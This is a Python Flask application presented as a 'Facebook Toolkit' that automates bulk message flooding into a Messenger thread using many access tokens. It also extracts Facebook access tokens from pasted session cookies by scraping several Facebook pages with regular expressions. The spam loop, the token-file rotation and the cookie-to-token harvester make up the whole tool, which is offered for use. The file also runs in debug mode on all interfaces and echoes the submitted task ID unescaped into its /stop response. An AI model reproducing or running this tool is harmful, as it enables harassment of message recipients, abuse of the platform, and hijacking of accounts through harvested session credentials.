from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import re
import json

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        print(f"✓ Message Sent Successfully: {message[:30]}...")
                    else:
                        print(f"✗ Message Failed: {response.text[:100]}")
                except Exception as e:
                    print(f"Error: {str(e)[:100]}")
                time.sleep(time_interval)

def parse_cookies(cookie_input):
    """Parse cookies from different formats"""
    cookies = {}
    
    # Try JSON format (from EditThisCookie or similar)
    try:
        cookie_list = json.loads(cookie_input)
        for cookie in cookie_list:
            if 'name' in cookie and 'value' in cookie:
                cookies[cookie['name']] = cookie['value']
        if cookies:
            return cookies
    except:
        pass
    
    # Try standard cookie string format
    if '=' in cookie_input:
        for item in cookie_input.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key.strip()] = value.strip()
        if cookies:
            return cookies
    
    return None

def fetch_facebook_token(cookies_dict):
    """Fetch actual Facebook access token using cookies"""
    session = requests.Session()
    session.cookies.update(cookies_dict)
    
    access_tokens = []
    
    try:
        # Method 1: Try to get token from business.facebook.com
        biz_url = 'https://business.facebook.com/business_locations'
        response = session.get(biz_url, headers=headers, timeout=15)
        
        # Search for EAA token in response
        patterns = [
            r'(EAAB[A-Za-z0-9]+)',
            r'(EAAC[A-Za-z0-9]+)',
            r'(EAAG[A-Za-z0-9]+)',
            r'(EAAD[A-Za-z0-9]+)',
            r'(EAAAA[A-Za-z0-9]+)',
            r'"accessToken":"([^"]+)"',
            r'accessToken=([^&]+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response.text)
            for match in matches:
                if match.startswith('EAA') and len(match) > 50:
                    access_tokens.append(match)
        
        # Method 2: Try mbasic version
        if not access_tokens:
            mbasic_url = 'https://mbasic.facebook.com/'
            response = session.get(mbasic_url, headers=headers, timeout=15)
            
            # Extract token from various places
            patterns = [
                r'access_token["\s:=]+([A-Za-z0-9]+)',
                r'\"accessToken\":\"([^\"]+)\"',
                r'name="access_token" value="([^"]+)"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if match.startswith('EAA') and len(match) > 50:
                        access_tokens.append(match)
        
        # Method 3: Try Graph API explorer
        if not access_tokens:
            graph_url = 'https://developers.facebook.com/tools/explorer/'
            response = session.get(graph_url, headers=headers, timeout=15)
            
            patterns = [
                r'access_token=([A-Za-z0-9]+)',
                r'"access_token":"([^"]+)"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if match.startswith('EAA') and len(match) > 50:
                        access_tokens.append(match)
        
        # Method 4: Try to get user ID and generate token
        if not access_tokens:
            user_id = cookies_dict.get('c_user', '')
            if user_id:
                # Try to get a page access token
                pages_url = f'https://graph.facebook.com/{user_id}/accounts'
                response = session.get(pages_url, headers=headers, timeout=15)
                
                patterns = [
                    r'access_token":"([^"]+)"',
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        if match.startswith('EAA'):
                            access_tokens.append(match)
        
        # Remove duplicates
        access_tokens = list(set(access_tokens))
        
        return access_tokens
        
    except Exception as e:
        print(f"Error fetching token: {str(e)}")
        return []

def extract_token_from_cookie(cookie_input):
    """Extract Facebook access token from cookie string (legacy method)"""
    patterns = [
        r'EAAB[A-Za-z0-9]+',
        r'EAAC[A-Za-z0-9]+',
        r'EAAG[A-Za-z0-9]+',
        r'EAAD[A-Za-z0-9]+',
        r'EAAAA[A-Za-z0-9]+'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, cookie_input)
        if match:
            return [match.group(0)]
    return []

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        action = request.form.get('action', 'send')
        
        if action == 'extract':
            cookie_input = request.form.get('cookieInput', '')
            extracted_tokens = []
            
            if cookie_input:
                # First try to parse cookies and fetch token
                cookies = parse_cookies(cookie_input)
                
                if cookies:
                    print(f"Parsed {len(cookies)} cookies")
                    # Try to fetch token using cookies
                    fetched_tokens = fetch_facebook_token(cookies)
                    extracted_tokens.extend(fetched_tokens)
                
                # Also try direct extraction
                direct_tokens = extract_token_from_cookie(cookie_input)
                for token in direct_tokens:
                    if token not in extracted_tokens:
                        extracted_tokens.append(token)
            
            if extracted_tokens:
                return jsonify({'success': True, 'tokens': extracted_tokens})
            else:
                # Return helpful message with instructions
                return jsonify({
                    'success': False, 
                    'message': 'Token not found. Try these methods:\n\n1. Login to Facebook\n2. Go to https://business.facebook.com/\n3. Open Developer Tools (F12)\n4. Go to Network tab\n5. Look for requests containing "access_token"\n6. Or use a token from Graph API Explorer'
                })
        
        else:
            token_option = request.form.get('tokenOption')
            
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                token_file = request.files['tokenFile']
                access_tokens = token_file.read().decode().strip().splitlines()
            
            access_tokens = [token.strip() for token in access_tokens if token.strip()]
            
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()
            
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()
            
            return f'''
            <div style="color: green; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px;">
                <h3>✓ Task Started Successfully!</h3>
                <p>Task ID: <strong>{task_id}</strong></p>
                <p>Tokens Loaded: {len(access_tokens)}</p>
                <p>Messages: {len(messages)}</p>
                <p>Save this Task ID to stop the task later!</p>
                <button onclick="location.href='/'" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 10px;">Back to Home</button>
            </div>
            '''
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>♛ AHMAD ALI SAFDAR ♛</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      min-height: 100vh;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .main-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      text-align: center;
      padding: 30px 20px;
      background: linear-gradient(135deg, rgba(102,126,234,0.3) 0%, rgba(118,75,162,0.3) 100%);
      border-radius: 20px;
      margin-bottom: 30px;
      border: 1px solid rgba(255,255,255,0.1);
      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
    }
    .header h1 {
      font-size: 2.5em;
      text-shadow: 0 0 20px rgba(102,126,234,0.8);
      animation: glow 3s ease-in-out infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 10px #667eea, 0 0 20px #667eea; }
      to { text-shadow: 0 0 20px #764ba2, 0 0 40px #764ba2; }
    }
    .tabs {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    .tab-btn {
      padding: 12px 30px;
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.15);
      color: white;
      border-radius: 50px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: all 0.3s;
      backdrop-filter: blur(10px);
    }
    .tab-btn:hover {
      background: rgba(102,126,234,0.3);
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    .tab-btn.active {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-color: transparent;
      box-shadow: 0 5px 20px rgba(102,126,234,0.4);
    }
    .tab-content {
      display: none;
      background: rgba(255,255,255,0.05);
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
      border: 1px solid rgba(255,255,255,0.1);
    }
    .tab-content.active {
      display: block;
    }
    .form-group {
      margin-bottom: 25px;
    }
    .form-label {
      display: block;
      margin-bottom: 10px;
      font-weight: 600;
      color: #fff;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .form-label i {
      margin-right: 8px;
      color: #667eea;
    }
    .form-control {
      width: 100%;
      padding: 14px 18px;
      background: rgba(0,0,0,0.3);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 12px;
      color: white;
      font-size: 15px;
      transition: all 0.3s;
    }
    .form-control:focus {
      outline: none;
      border-color: #667eea;
      background: rgba(0,0,0,0.4);
      box-shadow: 0 0 20px rgba(102,126,234,0.3);
    }
    .form-control::placeholder {
      color: rgba(255,255,255,0.4);
    }
    select.form-control option {
      background: #1a1a2e;
    }
    textarea.form-control {
      resize: vertical;
      min-height: 150px;
    }
    .btn {
      padding: 14px 35px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .btn-primary {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .btn-primary:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(102,126,234,0.4);
    }
    .btn-success {
      background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
      color: white;
    }
    .btn-success:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0,180,219,0.4);
    }
    .btn-danger {
      background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
      color: white;
    }
    .btn-danger:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(235,51,73,0.4);
    }
    .token-result {
      margin-top: 25px;
      padding: 20px;
      background: rgba(0,0,0,0.3);
      border-radius: 12px;
      border: 1px solid rgba(0,180,219,0.3);
    }
    .footer {
      text-align: center;
      margin-top: 40px;
      padding: 25px;
      background: rgba(0,0,0,0.2);
      border-radius: 20px;
      border: 1px solid rgba(255,255,255,0.05);
    }
    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
      flex-wrap: wrap;
    }
    .social-link {
      color: white;
      text-decoration: none;
      padding: 12px 25px;
      background: rgba(255,255,255,0.08);
      border-radius: 50px;
      transition: all 0.3s;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .social-link:hover {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      transform: translateY(-3px);
      color: white;
    }
    .info-box {
      background: rgba(102,126,234,0.15);
      padding: 18px;
      border-radius: 12px;
      margin-bottom: 25px;
      border-left: 4px solid #667eea;
    }
    .token-display {
      max-height: 250px;
      overflow-y: auto;
      padding: 15px;
      background: rgba(0,0,0,0.3);
      border-radius: 8px;
      margin-top: 15px;
    }
    .copy-btn {
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.2);
      color: white;
      padding: 8px 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-left: 10px;
    }
    .instruction-box {
      background: rgba(0,0,0,0.3);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
    }
    .instruction-box code {
      background: rgba(102,126,234,0.3);
      padding: 2px 8px;
      border-radius: 4px;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="main-container">
    <header class="header">
      <h1>♛ 𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝐈 𝐒𝐀𝐅𝐃𝐀𝐑 ♛</h1>
      <p style="margin-top: 15px; opacity: 0.9; font-size: 16px;">Advanced Facebook Toolkit v2.0</p>
    </header>

    <div class="tabs">
      <button class="tab-btn active" onclick="showTab(\'sender\')">
        <i class="fas fa-paper-plane"></i> Message Sender
      </button>
      <button class="tab-btn" onclick="showTab(\'extractor\')">
        <i class="fas fa-key"></i> Token Extractor
      </button>
      <button class="tab-btn" onclick="showTab(\'stopper\')">
        <i class="fas fa-stop-circle"></i> Stop Task
      </button>
    </div>

    <!-- Message Sender Tab -->
    <div id="sender" class="tab-content active">
      <div class="info-box">
        <i class="fas fa-info-circle"></i> 
        <strong>Instructions:</strong> Fill all fields to start sending messages automatically. Get token from the Token Extractor tab.
      </div>
      
      <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="send">
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-token"></i> Token Option
          </label>
          <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
            <option value="single">Single Token</option>
            <option value="multiple">Token File (Multiple Tokens)</option>
          </select>
        </div>
        
        <div class="form-group" id="singleTokenInput">
          <label class="form-label">
            <i class="fas fa-key"></i> Enter Access Token
          </label>
          <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
        </div>
        
        <div class="form-group" id="tokenFileInput" style="display: none;">
          <label class="form-label">
            <i class="fas fa-file"></i> Choose Token File (.txt)
          </label>
          <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
          <small style="color: #aaa;">One token per line</small>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-comments"></i> Conversation/Thread ID
          </label>
          <input type="text" class="form-control" id="threadId" name="threadId" placeholder="t_123456789..." required>
          <small style="color: #aaa;">Example: t_100064912345678</small>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-user"></i> Sender Name Prefix
          </label>
          <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Your Name" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-clock"></i> Time Interval (seconds)
          </label>
          <input type="number" class="form-control" id="time" name="time" value="5" min="1" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-file-alt"></i> Messages File (.txt)
          </label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          <small style="color: #aaa;">One message per line</small>
        </div>
        
        <button type="submit" class="btn btn-primary" style="width: 100%;">
          <i class="fas fa-play"></i> Start Sending Messages
        </button>
      </form>
    </div>

    <!-- Token Extractor Tab -->
    <div id="extractor" class="tab-content">
      <div class="info-box">
        <i class="fas fa-lightbulb"></i>
        <strong>How to get cookies (JSON format):</strong>
        <ol style="margin-top: 10px; margin-left: 20px;">
          <li>Install "EditThisCookie" extension in Chrome</li>
          <li>Login to Facebook</li>
          <li>Click on EditThisCookie icon</li>
          <li>Click "Export" button (arrow pointing right)</li>
          <li>Paste the copied JSON data below</li>
        </ol>
      </div>
      
      <div class="form-group">
        <label class="form-label">
          <i class="fas fa-cookie-bite"></i> Paste Facebook Cookies (JSON or String format)
        </label>
        <textarea class="form-control" id="cookieInput" rows="8" placeholder='Paste your Facebook cookies here (JSON format from EditThisCookie)...'></textarea>
      </div>
      
      <button class="btn btn-success" onclick="extractToken()" style="width: 100%;">
        <i class="fas fa-search"></i> Extract Token
      </button>
      
      <div class="instruction-box">
        <h4><i class="fas fa-info-circle"></i> Alternative Token Methods:</h4>
        <ul style="margin-top: 10px; margin-left: 20px;">
          <li>Go to <a href="https://business.facebook.com/" target="_blank" style="color: #667eea;">business.facebook.com</a> and look for access_token in Network tab</li>
          <li>Use <a href="https://developers.facebook.com/tools/explorer/" target="_blank" style="color: #667eea;">Graph API Explorer</a> to generate token</li>
        </ul>
      </div>
      
      <div id="tokenResult" class="token-result" style="display: none;">
        <h4><i class="fas fa-check-circle" style="color: #00b4db;"></i> Extracted Tokens:</h4>
        <div id="tokenList" class="token-display"></div>
        <button class="btn btn-primary" onclick="copyTokens()" style="margin-top: 15px;">
          <i class="fas fa-copy"></i> Copy All Tokens
        </button>
        <button class="btn btn-success" onclick="useToken()" style="margin-top: 15px; margin-left: 10px;">
          <i class="fas fa-arrow-right"></i> Use This Token
        </button>
      </div>
    </div>

    <!-- Stop Task Tab -->
    <div id="stopper" class="tab-content">
      <div class="info-box">
        <i class="fas fa-info-circle"></i>
        <strong>Stop Running Task:</strong> Enter the Task ID provided when you started the message sender.
      </div>
      
      <form method="post" action="/stop">
        <div class="form-group">
          <label class="form-label">
            <i class="fas fa-id-card"></i> Task ID
          </label>
          <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter Task ID" required>
        </div>
        
        <button type="submit" class="btn btn-danger" style="width: 100%;">
          <i class="fas fa-stop"></i> Stop Task
        </button>
      </form>
    </div>

    <footer class="footer">
      <p>© 2024 Developed by ♛ AHMAD ALI SAFDAR ♛</p>
      <div class="social-links">
        <a href="https://www.facebook.com/ahmadali.safdar.52" class="social-link" target="_blank">
          <i class="fab fa-facebook"></i> Facebook
        </a>
        <a href="https://wa.me/+923324661564" class="social-link" target="_blank">
          <i class="fab fa-whatsapp"></i> WhatsApp
        </a>
      </div>
    </footer>
  </div>

  <script>
    function showTab(tabName) {
      document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
      });
      
      document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
      });
      
      document.getElementById(tabName).classList.add('active');
      event.target.classList.add('active');
    }
    
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    function extractToken() {
      const cookieInput = document.getElementById('cookieInput').value;
      
      if (!cookieInput) {
        alert('Please paste your Facebook cookies first!');
        return;
      }
      
      // Show loading
      const btn = event.target;
      const originalText = btn.innerHTML;
      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Extracting...';
      btn.disabled = true;
      
      const formData = new FormData();
      formData.append('action', 'extract');
      formData.append('cookieInput', cookieInput);
      
      fetch('/', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        const resultDiv = document.getElementById('tokenResult');
        const tokenList = document.getElementById('tokenList');
        
        if (data.success) {
          let html = '';
          data.tokens.forEach((token, index) => {
            html += `<div style="margin-bottom: 15px; padding: 12px; background: rgba(0,180,219,0.15); border-radius: 8px; border: 1px solid rgba(0,180,219,0.3);">
              <strong>Token ${index + 1}:</strong><br>
              <span style="word-break: break-all; font-family: monospace;">${token}</span>
              <button class="copy-btn" onclick="copySingleToken(\'${token}\')">
                <i class="fas fa-copy"></i> Copy
              </button>
            </div>`;
          });
          tokenList.innerHTML = html;
          resultDiv.style.display = 'block';
          window.extractedTokens = data.tokens;
        } else {
          alert('No token found! ' + (data.message || 'Try alternative methods.'));
        }
        
        btn.innerHTML = originalText;
        btn.disabled = false;
      })
      .catch(error => {
        alert('Error extracting token: ' + error);
        btn.innerHTML = originalText;
        btn.disabled = false;
      });
    }
    
    function copyTokens() {
      if (window.extractedTokens && window.extractedTokens.length > 0) {
        const textToCopy = window.extractedTokens.join('\\n');
        navigator.clipboard.writeText(textToCopy).then(() => {
          alert('Tokens copied to clipboard!');
        }).catch(err => {
          const textarea = document.createElement('textarea');
          textarea.value = textToCopy;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
          alert('Tokens copied to clipboard!');
        });
      }
    }
    
    function copySingleToken(token) {
      navigator.clipboard.writeText(token).then(() => {
        alert('Token copied!');
      });
    }
    
    function useToken() {
      if (window.extractedTokens && window.extractedTokens.length > 0) {
        showTab('sender');
        document.getElementById('tokenOption').value = 'single';
        toggleTokenInput();
        document.getElementById('singleToken').value = window.extractedTokens[0];
      }
    }
    
    document.addEventListener('DOMContentLoaded', function() {
      toggleTokenInput();
    });
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'''
        <div style="color: #00b4db; padding: 30px; text-align: center; background: rgba(0,0,0,0.5); border-radius: 15px;">
            <h3><i class="fas fa-check-circle"></i> Task {task_id} has been stopped!</h3>
            <button onclick="location.href='/'" style="padding: 12px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 50px; margin-top: 20px; cursor: pointer;">Back to Home</button>
        </div>
        '''
    else:
        return f'''
        <div style="color: #eb3349; padding: 30px; text-align: center; background: rgba(0,0,0,0.5); border-radius: 15px;">
            <h3><i class="fas fa-times-circle"></i> No task found with ID: {task_id}</h3>
            <button onclick="location.href='/'" style="padding: 12px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 50px; margin-top: 20px; cursor: pointer;">Back to Home</button>
        </div>
        '''

if __name__ == '__main__':
    print("\n" + "="*60)
    print("♛ AHMAD ALI SAFDAR - Facebook Toolkit v2.0 ♛")
    print("="*60)
    print("Server running at: http://0.0.0.0:5000")
    print("Press Ctrl+C to stop the server")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=5000)
